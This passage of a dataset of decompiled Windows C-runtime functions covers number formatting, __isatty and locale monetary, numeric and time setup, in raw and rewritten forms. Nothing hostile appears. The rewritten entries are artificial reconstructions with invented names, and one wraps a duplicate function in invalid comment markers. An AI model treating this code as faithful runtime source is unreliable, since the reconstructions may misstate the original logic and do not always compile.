+\n(ulonglong)uVar11;\n*(int *)((int)&uStack_3a4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != puStack_3a8);\ngoto LAB_100329fc;\n}\ngoto LAB_10032be8;\n}\nlocal_578 = (undefined8 *)0x0;\npuStack_3a8 = (undefined8 *)0x0;\nrVar8 = 0;\npuVar14 = &local_574;\nLAB_10032bd7:\n_memcpy_s(&uStack_3a4,0x1cc,puVar14,rVar8);\nLAB_10032be8:\nbVar3 = true;\n}\nif (!bVar3) goto LAB_10032c6a;\nlocal_774 = (undefined8 *)((int)local_774 - (int)local_754);\n} while (local_774 != (undefined8 *)0x0);\nuVar17 = local_76c._4_4_;\n}\nif (uVar17 != 0) {\nuVar17 = *(uint *)(&DAT_1003e9ec + uVar17 * 2);\nif (uVar17 == 0) {\nLAB_10032c6a:\npuStack_3a8 = (undefined8 *)0x0;\npuVar14 = &uStack_3a4;\nLAB_1003311d:\n_memcpy_s(puVar14,0x1cc,auStack_968,0);\n}\nelse if (uVar17 != 1) {\nlocal_76c = CONCAT44(puStack_3a8,(uint)local_76c);\nif (puStack_3a8 != (undefined8 *)0x0) {\nuVar11 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)uVar17 *\n(ulonglong)*(uint *)((int)&uStack_3a4 + (int)puVar14 * 4) +\n(ulonglong)uVar11;\n*(int *)((int)&uStack_3a4 + (int)puVar14 * 4) = (int)lVar23;\nuVar11 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != puStack_3a8);\nif (uVar11 != 0) {\nif ((undefined8 *)0x72 < puStack_3a8) goto LAB_10032c6a;\n*(uint *)((int)&uStack_3a4 + (int)puStack_3a8 * 4) = uVar11;\npuStack_3a8 = (undefined8 *)((int)puStack_3a8 + 1);\n}\n}\n}\n}\n}\npcVar18 = local_77c;\nlocal_750 = (undefined8 *)local_77c;\nif (local_1d8 != (undefined8 *)0x0) {\nuVar17 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)*(uint *)((int)&local_1d4 + (int)puVar14 * 4) * 10 +\n(ulonglong)uVar17;\n*(int *)((int)&local_1d4 + (int)puVar14 * 4) = (int)lVar23;\nuVar17 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != local_1d8);\nlocal_76c = CONCAT44(uVar17,(uint)local_76c);\nif (uVar17 != 0) {\nif (local_1d8 < (undefined8 *)0x73) {\n*(uint *)((int)&local_1d4 + (int)local_1d8 * 4) = uVar17;\nlocal_1d8 = (undefined8 *)((int)local_1d8 + 1);\n}\nelse {\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,auStack_968,0);\n}\n}\n}\nuVar22 = FUN_10022710((uint *)&local_1d8,(uint *)&puStack_3a8);\nif ((int)uVar22 == 10) {\nlocal_770 = local_770 + 1;\nlocal_750 = (undefined8 *)(pcVar18 + 1);\n*pcVar18 = '1';\nif (puStack_3a8 != (undefined8 *)0x0) {\nuVar17 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)*(uint *)((int)&uStack_3a4 + (int)puVar14 * 4) * 10 +\n(ulonglong)uVar17;\n*(int *)((int)&uStack_3a4 + (int)puVar14 * 4) = (int)lVar23;\nuVar17 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != puStack_3a8);\nif (uVar17 != 0) {\nif (puStack_3a8 < (undefined8 *)0x73) {\n*(uint *)((int)&uStack_3a4 + (int)puStack_3a8 * 4) = uVar17;\npuStack_3a8 = (undefined8 *)((int)puStack_3a8 + 1);\n}\nelse {\npuStack_3a8 = (undefined8 *)0x0;\n_memcpy_s(&uStack_3a4,0x1cc,auStack_968,0);\n}\n}\n}\nLAB_10033281:\npcVar18 = pcVar18 + 1;\nuVar17 = local_770;\n}\nelse {\nif ((int)uVar22 != 0) {\nlocal_750 = (undefined8 *)(pcVar18 + 1);\n*pcVar18 = (char)uVar22 + '0';\ngoto LAB_10033281;\n}\nuVar17 = local_770 - 1;\n}\nlocal_784[1] = uVar17;\nif ((-1 < (int)uVar17) && (local_780 < 0x80000000)) {\nlocal_780 = (char *)((int)local_780 + uVar17);\n}\nuVar17 = param_6 - 1;\nif (local_780 <= param_6 - 1) {\nuVar17 = (uint)local_780;\n}\nlocal_780 = local_77c + uVar17;\nif (pcVar18 != local_780) {\ndo {\npcVar25 = (char *)local_750;\nif (local_1d8 == (undefined8 *)0x0) break;\nuVar17 = 0;\npuVar14 = (undefined8 *)0x0;\ndo {\nlVar23 = (ulonglong)*(uint *)((int)&local_1d4 + (int)puVar14 * 4) * 1000000000 +\n(ulonglong)uVar17;\n*(int *)((int)&local_1d4 + (int)puVar14 * 4) = (int)lVar23;\nuVar17 = (uint)((ulonglong)lVar23 >> 0x20);\npuVar14 = (undefined8 *)((int)puVar14 + 1);\n} while (puVar14 != local_1d8);\nif (uVar17 != 0) {\nif (local_1d8 < (undefined8 *)0x73) {\n*(uint *)((int)&local_1d4 + (int)local_1d8 * 4) = uVar17;\nlocal_1d8 = (undefined8 *)((int)local_1d8 + 1);\n}\nelse {\nlocal_1d8 = (undefined8 *)0x0;\n_memcpy_s(&local_1d4,0x1cc,auStack_968,0);\n}\n}\nuVar22 = FUN_10022710((uint *)&local_1d8,(uint *)&puStack_3a8);\nuVar11 = 8;\nuVar17 = (int)local_780 - (int)pcVar25;\ndo {\nuVar2 = uVar22 & 0xffffffff;\nuVar22 = uVar2 / uStack_778;\nif (uVar11 <= uVar17) {\npcVar25[uVar11] = (char)(uVar2 % (ulonglong)uStack_778) + '0';\n}\nuVar11 = uVar11 - 1;\n} while (uVar11 != 0xffffffff);\nif (9 < uVar17) {\nuVar17 = 9;\n}\npcVar18 = pcVar25 + uVar17;\nlocal_750 = (undefined8 *)pcVar18;\n} while (pcVar18 != local_780);\n}\n*pcVar18 = '\\0';\ngoto LAB_100333c4;\n}\npcVar25 = \"1#IND\";\n}\n}\neVar10 = _strcpy_s(pcVar18,param_6,pcVar25);\nif (eVar10 != 0) {\n\n__invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);\n}\nLAB_100333c4:\nif (local_794 != '\\0') {\n_fesetenv((uint *)&local_79c);\n}\n___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\nreturn;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_1d0 : undefined4\nLocal Variable: local_1d4 : undefined4\nLocal Variable: local_1d8 : undefined4\nLocal Variable: local_570 : undefined4\nLocal Variable: local_574 : undefined4\nLocal Variable: local_578 : undefined4\nLocal Variable: local_750 : undefined4\nLocal Variable: local_754 : undefined4\nLocal Variable: local_758 : undefined4\nLocal Variable: local_764 : undefined4\nLocal Variable: local_76c : undefined8\nLocal Variable: local_770 : undefined4\nLocal Variable: local_774 : undefined4\nLocal Variable: local_77c : undefined4\nLocal Variable: local_780 : undefined4\nLocal Variable: local_784 : undefined4\nLocal Variable: local_78c : undefined4\nLocal Variable: local_794 : undefined1\nLocal Variable: local_79c : undefined4\nLocal Variable: local_980 : undefined8"}
{"Function Name": "__isatty", "Address": "100333f8", "Source Code": "int __cdecl __isatty(int file_handle)\n{\n    \n    if (file_handle == -2) {\n        \n        *(undefined4 *)set_specific_value_address() = 9;\n    } \n    \n    else if ((-1 < file_handle) && ((uint)file_handle < max_file_handle_limit)) {\n        \n        return *(byte *)((&file_handle_data)[file_handle >> 6] + 0x28 + (file_handle & 0x3fU) * 0x30) & 0x40;\n    } \n    \n    else {\n        \n        *(undefined4 *)set_specific_value_address() = 9;\n        \n        handle_invalid_file_handle();\n    }\n    \n    return 0;\n}"}
{"Function Name": "___acrt_locale_free_monetary", "Address": "1003344e", "Source Code": "void __cdecl ___acrt_locale_free_monetary(int locale_pointer)\n{\n    \n    if (locale_pointer != 0) {\n        \n        for (int current_offset = 0xc; current_offset <= 0x4c; current_offset += 4) {\n            \n            if (*(undefined **)(locale_pointer + current_offset) != *(undefined **)(0x1004e0c4 + (current_offset - 0xc))) {\n                \n                FID_conflict__free(*(undefined **)(locale_pointer + current_offset));\n            }\n        }\n    }\n}"}
{"Function Name": "___acrt_locale_initialize_monetary", "Address": "1003354c", "Source Code": "undefined4 __cdecl ___acrt_locale_initialize_monetary(int param_1)\n{\nchar cVar1;\nint *piVar2;\nundefined **ppuVar3;\nundefined4 *puVar4;\nuint uVar5;\nuint uVar6;\nuint uVar7;\nuint uVar8;\nuint uVar9;\nuint uVar10;\nuint uVar11;\nuint uVar12;\nuint uVar13;\nuint uVar14;\nuint uVar15;\nuint uVar16;\nuint uVar17;\nuint uVar18;\nuint uVar19;\nuint uVar20;\nuint uVar21;\nuint uVar22;\nuint uVar23;\nuint uVar24;\nuint uVar25;\nundefined4 uVar26;\nint iVar27;\nwchar_t *pwVar28;\nwchar_t *pwVar29;\nundefined **ppuVar30;\nint local_1c;\nundefined4 local_18;\nwchar_t **local_14;\nundefined4 *local_10;\nundefined4 *local_c;\nundefined **local_8;\nlocal_10 = (undefined4 *)0x0;\nlocal_1c = param_1;\nlocal_18 = 0;\nif ((*(int *)(param_1 + 0xac) == 0) && (*(int *)(param_1 + 0xb0) == 0)) {\nlocal_c = (undefined4 *)0x0;\nppuVar3 = &PTR_DAT_1004e0b8;\nLAB_100338bb:\npuVar4 = local_10;\npiVar2 = *(int **)(param_1 + 0x84);\nif (piVar2 != (int *)0x0) {\nLOCK();\n*piVar2 = *piVar2 + -1;\nUNLOCK();\n}\npiVar2 = *(int **)(param_1 + 0x7c);\nif (piVar2 != (int *)0x0) {\nLOCK();\niVar27 = *piVar2;\n*piVar2 = iVar27 + -1;\nUNLOCK();\nif (iVar27 + -1 == 0) {\nFID_conflict__free(*(void **)(param_1 + 0x88));\nFID_conflict__free(*(void **)(param_1 + 0x7c));\n}\n}\n*(undefined4 **)(param_1 + 0x7c) = local_c;\nuVar26 = 0;\n*(undefined4 **)(param_1 + 0x84) = puVar4;\n*(undefined ***)(param_1 + 0x88) = ppuVar3;\n}\nelse {\nppuVar3 = (undefined **)__calloc_base(1,0x50);\nlocal_8 = ppuVar3;\nFID_conflict__free((void *)0x0);\nif (ppuVar3 != (undefined **)0x0) {\npuVar4 = (undefined4 *)__calloc_base(1,4);\nlocal_c = puVar4;\nFID_conflict__free((void *)0x0);\nif (puVar4 == (undefined4 *)0x0) {\nFID_conflict__free(ppuVar3);\n}\nelse {\nif (*(int *)(param_1 + 0xac) == 0) {\nppuVar3 = &PTR_DAT_1004e0b8;\nppuVar30 = local_8;\nfor (iVar27 = 0x14; iVar27 != 0; iVar27 = iVar27 + -1) {\n*ppuVar30 = *ppuVar3;\nppuVar3 = ppuVar3 + 1;\nppuVar30 = ppuVar30 + 1;\n}\nLAB_1003386d:\n*local_8 = (undefined *)**(undefined4 **)(param_1 + 0x88);\nlocal_8[1] = *(undefined **)(*(int *)(param_1 + 0x88) + 4);\nlocal_8[2] = *(undefined **)(*(int *)(param_1 + 0x88) + 8);\nlocal_8[0xc] = *(undefined **)(*(int *)(param_1 + 0x88) + 0x30);\nlocal_8[0xd] = *(undefined **)(*(int *)(param_1 + 0x88) + 0x34);\n*local_c = 1;\nppuVar3 = local_8;\nif (local_10 != (undefined4 *)0x0) {\n*local_10 = 1;\n}\ngoto LAB_100338bb;\n}\npuVar4 = (undefined4 *)__calloc_base(1,4);\nlocal_10 = puVar4;\nFID_conflict__free((void *)0x0);\nif (puVar4 == (undefined4 *)0x0) {\nFID_conflict__free(ppuVar3);\nFID_conflict__free(local_c);\n}\nelse {\npwVar28 = *(wchar_t **)(param_1 + 0xac);\nuVar5 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x15,\n(wchar_t **)(ppuVar3 + 3));\nuVar6 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x14,\n(wchar_t **)(local_8 + 4));\nuVar7 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x16,\n(wchar_t **)(local_8 + 5));\nuVar8 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x17,\n(wchar_t **)(local_8 + 6));\nlocal_14 = (wchar_t **)(local_8 + 7);\nuVar9 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&local_1c,1,pwVar28,0x18,local_14)\n;\nuVar10 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x50,\n(wchar_t **)(local_8 + 8));\nuVar11 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,1,pwVar28,0x51,\n(wchar_t **)(local_8 + 9));\nuVar12 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x1a,\n(wchar_t **)(local_8 + 10));\nuVar13 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x19,\n(wchar_t **)((int)local_8 + 0x29));\nuVar14 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x54,\n(wchar_t **)((int)local_8 + 0x2a));\nuVar15 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x55,\n(wchar_t **)((int)local_8 + 0x2b));\nuVar16 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x56,\n(wchar_t **)(local_8 + 0xb));\nuVar17 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x57,\n(wchar_t **)((int)local_8 + 0x2d));\nuVar18 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x52,\n(wchar_t **)((int)local_8 + 0x2e));\nuVar19 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,0,pwVar28,0x53,\n(wchar_t **)((int)local_8 + 0x2f));\nuVar20 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x15,\n(wchar_t **)(local_8 + 0xe));\nuVar21 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x14,\n(wchar_t **)(local_8 + 0xf));\nuVar22 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x16,\n(wchar_t **)(local_8 + 0x10));\nuVar23 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x17,\n(wchar_t **)(local_8 + 0x11));\nuVar24 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x50,\n(wchar_t **)(local_8 + 0x12));\nuVar25 = ___acrt_GetLocaleInfoA\n((__crt_locale_pointers *)&local_1c,2,pwVar28,0x51,\n(wchar_t **)(local_8 + 0x13));\nppuVar3 = local_8;\nif ((uVar25 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 |\nuVar14 | uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 |\nuVar22 | uVar23 | uVar24) == 0) {\npwVar28 = *local_14;\nwhile (*(char *)pwVar28 != '\\0') {\ncVar1 = *(char *)pwVar28;\nif ((cVar1 < '0') || ('9' < cVar1)) {\npwVar29 = pwVar28;\nif (cVar1 != ';') goto LAB_10033843;\ndo {\n*(char *)pwVar29 = *(char *)((int)pwVar29 + 1);\npwVar29 = (wchar_t *)((int)pwVar29 + 1);\n} while (*(char *)pwVar29 != '\\0');\n}\nelse {\n*(char *)pwVar28 = cVar1 + -0x30;\nLAB_10033843:\npwVar28 = (wchar_t *)((int)pwVar28 + 1);\n}\n}\ngoto LAB_1003386d;\n}\n___acrt_locale_free_monetary((int)local_8);\nFID_conflict__free(ppuVar3);\nFID_conflict__free(local_c);\nFID_conflict__free(local_10);\n}\n}\n}\nuVar26 = 1;\n}\nreturn uVar26;\n}\nLocal Variable: local_8 : undefined4\nLocal Variable: local_c : undefined4\nLocal Variable: local_10 : undefined4\nLocal Variable: local_14 : undefined4\nLocal Variable: local_18 : undefined4\nLocal Variable: local_1c : undefined4"}
{"Function Name": "___acrt_locale_free_numeric", "Address": "10033908", "Source Code": "void __cdecl ___acrt_locale_free_numeric(void **locale_array)\n{\n    \n    if (locale_array != (void **)0x0) {\n        \n        for (int index = 0; index < 5; index++) {\n            \n            if ((undefined *)locale_array[index] != (undefined *)PTR_DAT_1004e0b8 + index * 4) {\n                \n                FID_conflict__free(locale_array[index]);\n            }\n        }\n    }\n}"}
{"Function Name": "___acrt_locale_initialize_numeric", "Address": "10033971", "Source Code": "\\*\nwchar_t ** __cdecl ___acrt_locale_initialize_numeric(int param_1)\n{\n    wchar_t **localePointer; // Pointer to wide character string\n    wchar_t **localeArray;  // Local pointer for wide character array\n    undefined4 *localMemory; // Pointer for local memory allocation\n    int loopCounter;          // Loop counter\n    wchar_t *localeInfoPointer;    // Pointer to wide character\n    wchar_t **localeArrayIterator; // Pointer for wide character array iteration\n    uint localeInfo1, localeInfo2, localeInfo3, localeInfo4, localeInfo5; // Variables for locale info retrieval\n\n    // Check if specific parameters are zero\n    if ((*(int *)(param_1 + 0xb0) == 0) && (*(int *)(param_1 + 0xac) == 0)) {\n        localePointer = (wchar_t **)&PTR_DAT_1004e0b8; // Set pointer to default value\n    } else {\n        localeArray = (wchar_t **)__calloc_base(1, 0x50); // Allocate memory for wide character array\n        if (localeArray == (wchar_t **)0x0) {\n            return (wchar_t **)0x1; // Return error if allocation fails\n        }\n        localePointer = *(wchar_t ***)(param_1 + 0x88); // Get pointer from parameter\n        localeArrayIterator = localeArray; // Initialize iteration pointer\n        for (loopCounter = 0x14; loopCounter != 0; loopCounter--) { // Copy data from ppwVar10 to local_8\n            *localeArrayIterator++ = *localePointer++;\n        }\n        localMemory = (undefined4 *)__malloc_base(4); // Allocate memory for local variable\n        if (localMemory == (undefined4 *)0x0) {\n            FID_conflict__free(localeArray); // Free allocated memory on failure\n            return (wchar_t **)0x1; // Return error\n        }\n        *localMemory = 0; // Initialize local variable\n        if (*(int *)(param_1 + 0xb0) == 0) { // Check if specific parameter is zero\n            // Set default locale values in local_8\n            localeArray[0] = (wchar_t *)PTR_DAT_1004e0b8;\n            localeArray[1] = (wchar_t *)PTR_DAT_1004e0bc;\n            localeArray[2] = (wchar_t *)PTR_DAT_1004e0c0;\n            localeArray[0xc] = (wchar_t *)PTR_DAT_1004e0e8;\n            localeArray[0xd] = (wchar_t *)PTR_DAT_1004e0ec;\n        } else {\n            localeInfoPointer = *(wchar_t **)(param_1 + 0xb0); // Get pointer to locale info\n            // Retrieve locale information\n            localeInfo1 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0xe, localeArray);\n            localeInfo2 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0xf, localeArray + 1);\n            localeInfo3 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0x10, localeArray + 2);\n            localeInfo4 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 2, localeInfoPointer, 0xe, localeArray + 0xc);\n            localeInfo5 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 2, localeInfoPointer, 0xf, localeArray + 0xd);\n            // Check for errors in locale info retrieval\n            if ((localeInfo5 | localeInfo1 | localeInfo2 | localeInfo3 | localeInfo4) != 0) {\n                ___acrt_locale_free_numeric(localeArray); // Free allocated memory on error\n                FID_conflict__free(localMemory); // Free local variable memory\n                return localePointer; // Return original pointer\n            }\n            localeInfoPointer = *localeArray + 2; // Set pointer for processing locale data\n            while (*(char *)localeInfoPointer != '\\0') { // Process each character until null terminator\n                char cVar1 = *(char *)localeInfoPointer; // Get current character\n                if ((cVar1 < '0') || ('9' < cVar1)) { // Check if character is not a digit\n                    if (cVar1 == ';') { // If character is a semicolon\n                        do {\n                            *(char *)localeInfoPointer = *(char *)((int)localeInfoPointer + 1); // Shift characters left\n                            localeInfoPointer = (wchar_t *)((int)localeInfoPointer + 1); // Move to next character\n                        } while (*(char *)localeInfoPointer != '\\0'); // Continue until null terminator\n                    }\n                } else {\n                    *(char *)localeInfoPointer = cVar1 + -0x30; // Convert character to integer value\n                }\n                localeInfoPointer = (wchar_t *)((int)localeInfoPointer + 1); // Move to next character\n            }\n        }\n        *localMemory = 1; // Set local variable to indicate success\n    }\n\n    int *referenceCountPointer = *(int **)(param_1 + 0x80); // Get pointer to reference count\n    if (referenceCountPointer != (int *)0x0) { // Check if pointer is not null\n        LOCK(); // Acquire lock\n        *referenceCountPointer -= 1; // Decrement reference count\n        UNLOCK(); // Release lock\n    }\n    referenceCountPointer = *(int **)(param_1 + 0x7c); // Get another reference count pointer\n    if (referenceCountPointer != (int *)0x0) { // Check if pointer is not null\n        LOCK(); // Acquire lock\n        loopCounter = *referenceCountPointer; // Store current reference count\n        *referenceCountPointer -= 1; // Decrement reference count\n        UNLOCK(); // Release lock\n        if (loopCounter - 1 == 0) { // Check if reference count reached zero\n            FID_conflict__free(*(void **)(param_1 + 0x7c)); // Free memory if zero\n            FID_conflict__free(*(void **)(param_1 + 0x88)); // Free another memory\n        }\n    }\n    *(undefined4 **)(param_1 + 0x7c) = localMemory; // Set local_c in parameter structure\n    *(undefined4 **)(param_1 + 0x80) = localMemory; // Set local_c in another location\n    *(wchar_t ***)(param_1 + 0x88) = localePointer; // Set ppwVar10 in parameter structure\n    return (wchar_t **)0x0; // Return success\n}\n*\\ \n \n\nwchar_t ** __cdecl ___acrt_locale_initialize_numeric(int param_1)\n{\n    wchar_t **localePointer;\n    wchar_t **localeArray;\n    undefined4 *localMemory;\n    int loopCounter;\n    wchar_t *localeInfoPointer;\n    wchar_t **localeArrayIterator;\n    uint localeInfo1, localeInfo2, localeInfo3, localeInfo4, localeInfo5;\n\n    if ((*(int *)(param_1 + 0xb0) == 0) && (*(int *)(param_1 + 0xac) == 0)) {\n        localePointer = (wchar_t **)&PTR_DAT_1004e0b8;\n    } else {\n        localeArray = (wchar_t **)__calloc_base(1, 0x50);\n        if (localeArray == (wchar_t **)0x0) {\n            return (wchar_t **)0x1;\n        }\n        localePointer = *(wchar_t ***)(param_1 + 0x88);\n        localeArrayIterator = localeArray;\n        for (loopCounter = 0x14; loopCounter != 0; loopCounter--) {\n            *localeArrayIterator++ = *localePointer++;\n        }\n        localMemory = (undefined4 *)__malloc_base(4);\n        if (localMemory == (undefined4 *)0x0) {\n            FID_conflict__free(localeArray);\n            return (wchar_t **)0x1;\n        }\n        *localMemory = 0;\n        if (*(int *)(param_1 + 0xb0) == 0) {\n            localeArray[0] = (wchar_t *)PTR_DAT_1004e0b8;\n            localeArray[1] = (wchar_t *)PTR_DAT_1004e0bc;\n            localeArray[2] = (wchar_t *)PTR_DAT_1004e0c0;\n            localeArray[0xc] = (wchar_t *)PTR_DAT_1004e0e8;\n            localeArray[0xd] = (wchar_t *)PTR_DAT_1004e0ec;\n        } else {\n            localeInfoPointer = *(wchar_t **)(param_1 + 0xb0);\n            localeInfo1 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0xe, localeArray);\n            localeInfo2 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0xf, localeArray + 1);\n            localeInfo3 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 1, localeInfoPointer, 0x10, localeArray + 2);\n            localeInfo4 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 2, localeInfoPointer, 0xe, localeArray + 0xc);\n            localeInfo5 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&param_1, 2, localeInfoPointer, 0xf, localeArray + 0xd);\n            if ((localeInfo5 | localeInfo1 | localeInfo2 | localeInfo3 | localeInfo4) != 0) {\n                ___acrt_locale_free_numeric(localeArray);\n                FID_conflict__free(localMemory);\n                return localePointer;\n            }\n            localeInfoPointer = *localeArray + 2;\n            while (*(char *)localeInfoPointer != '\\0') {\n                char cVar1 = *(char *)localeInfoPointer;\n                if ((cVar1 < '0') || ('9' < cVar1)) {\n                    if (cVar1 == ';') {\n                        do {\n                            *(char *)localeInfoPointer = *(char *)((int)localeInfoPointer + 1);\n                            localeInfoPointer = (wchar_t *)((int)localeInfoPointer + 1);\n                        } while (*(char *)localeInfoPointer != '\\0');\n                    }\n                } else {\n                    *(char *)localeInfoPointer = cVar1 + -0x30;\n                }\n                localeInfoPointer = (wchar_t *)((int)localeInfoPointer + 1);\n            }\n        }\n        *localMemory = 1;\n    }\n\n    int *referenceCountPointer = *(int **)(param_1 + 0x80);\n    if (referenceCountPointer != (int *)0x0) {\n        LOCK();\n        *referenceCountPointer -= 1;\n        UNLOCK();\n    }\n    referenceCountPointer = *(int **)(param_1 + 0x7c);\n    if (referenceCountPointer != (int *)0x0) {\n        LOCK();\n        loopCounter = *referenceCountPointer;\n        *referenceCountPointer -= 1;\n        UNLOCK();\n        if (loopCounter - 1 == 0) {\n            FID_conflict__free(*(void **)(param_1 + 0x7c));\n            FID_conflict__free(*(void **)(param_1 + 0x88));\n        }\n    }\n    *(undefined4 **)(param_1 + 0x7c) = localMemory;\n    *(undefined4 **)(param_1 + 0x80) = localMemory;\n    *(wchar_t ***)(param_1 + 0x88) = localePointer;\n    return (wchar_t **)0x0;\n}\n"}
{"Function Name": "free_crt_array_internal", "Address": "10033b8d", "Source Code": "void __cdecl free_crt_array_internal(void **array, uint num_elements)\n{\n    uint freed_count = 0; \n    uint elements_to_free = ~-(uint)(array + num_elements < array) & ((int)(array + num_elements) + (3 - (int)array)) >> 2; \n    if (elements_to_free != 0) { \n        do {\n            FID_conflict__free(*array); \n            array++; \n            freed_count++; \n        } while (freed_count != elements_to_free); \n    }\n}"}
{"Function Name": "initialize_lc_time", "Address": "10033bc9", "Source Code": "bool __cdecl initialize_lc_time(__crt_lc_time_data *param_1, __crt_locale_data *param_2)\n{\n    wchar_t *localeNamePointer; \n    uint localeInfoResult1, localeInfoResult2, localeInfoResult3, localeInfoResult4, localeInfoResult5, localeInfoResult6, localeInfoResult7, localeInfoResult8, localeInfoResult9, localeInfoResult10, accumulatedResult; \n    wchar_t *localeInfoPointer; \n    uint localeIndex; \n    __crt_locale_data *localeDataPointer; \n    wchar_t **localeInfoArrayPointer = (wchar_t **)0x31; \n    int loopCounter1 = 7; \n    localeInfoPointer = *(wchar_t **)(param_2 + 0xb4); \n    localeDataPointer = param_2; \n    localeNamePointer = ___acrt_copy_locale_name(localeInfoPointer); \n    *(wchar_t **)(param_1 + 0x160) = localeNamePointer; \n    accumulatedResult = 0; \n    do {\n        localeInfoResult10 = ((int)localeInfoArrayPointer - 0x30U) % 7; \n        localeInfoResult1 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, (uint)localeInfoArrayPointer, (wchar_t **)(param_1 + localeInfoResult10 * 4)); \n        localeIndex = (int)localeInfoArrayPointer - 7; \n        localeInfoResult2 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, localeIndex, (wchar_t **)(param_1 + localeInfoResult10 * 4 + 0x1c)); \n        localeInfoResult3 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, (uint)localeInfoArrayPointer, (wchar_t **)(param_1 + localeInfoResult10 * 4 + 0xb4)); \n        localeInfoPointer = localeInfoPointer; \n        localeInfoResult10 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, localeIndex, (wchar_t **)(param_1 + localeInfoResult10 * 4 + 0xd0)); \n        accumulatedResult |= localeInfoResult1 | localeInfoResult2 | localeInfoResult3 | localeInfoResult10; \n        localeInfoArrayPointer = (wchar_t **)((int)localeInfoArrayPointer + 1); \n        loopCounter1--; \n    } while (loopCounter1 != 0); \n    localeInfoArrayPointer = (wchar_t **)(param_1 + 0x68); \n    wchar_t *localeInfoIndexPointer = (wchar_t *)0x38; \n    loopCounter1 = 0xc; \n    do {\n        localeInfoResult1 = (int)localeInfoIndexPointer + 0xc; \n        localeInfoResult2 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, localeInfoResult1, localeInfoArrayPointer - 0xc); \n        localeInfoResult3 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, (uint)localeInfoIndexPointer, localeInfoArrayPointer); \n        localeInfoResult10 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, localeInfoResult1, localeInfoArrayPointer + 0x21); \n        localeIndex = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 2, localeInfoPointer, (uint)localeInfoIndexPointer, localeInfoArrayPointer + 0x2d); \n        accumulatedResult |= localeInfoResult2 | localeInfoResult3 | localeInfoResult10 | localeIndex; \n        localeInfoArrayPointer++; \n        localeInfoIndexPointer = (wchar_t *)((uint)localeInfoIndexPointer + 1); \n        loopCounter1--; \n    } while (loopCounter1 != 0); \n    \n    localeInfoResult1 = ___acrt_GetLocaleInfoA((__crt_locale_pointers *)&localeDataPointer, 1, localeInfoPointer, 0x28, 